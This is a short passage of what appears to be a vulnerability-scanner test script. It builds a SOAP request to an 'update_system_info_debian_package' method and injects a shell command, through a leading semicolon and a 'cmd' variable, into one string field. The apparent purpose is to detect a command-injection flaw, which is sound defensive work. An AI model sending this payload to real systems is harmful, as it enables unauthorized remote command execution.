...
soap = "<soap:Envelope soap:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/' xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/' " + "xmlns:soapenc='http://schemas.xmlsoap.org/soap/encoding/' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'>" + "<soap:Body><update_system_info_debian_package xmlns='AV/CC/Util'><c-gensym3 xsi:type='xsd:string'>VTTest</c-gensym3><c-gensym5 xsi:type='xsd:string'>VTTest</c-gensym5>" + "<c-gensym7 xsi:type='xsd:string'>VTTest</c-gensym7><c-gensym9 xsi:type='xsd:string'>VTTest</c-gensym9><c-gensym11 xsi:type='xsd:string'>;" + cmd + "</c-gensym11></update_system_info_debian_package></soap:Body></soap:Envelope>";
len = strlen( soap );
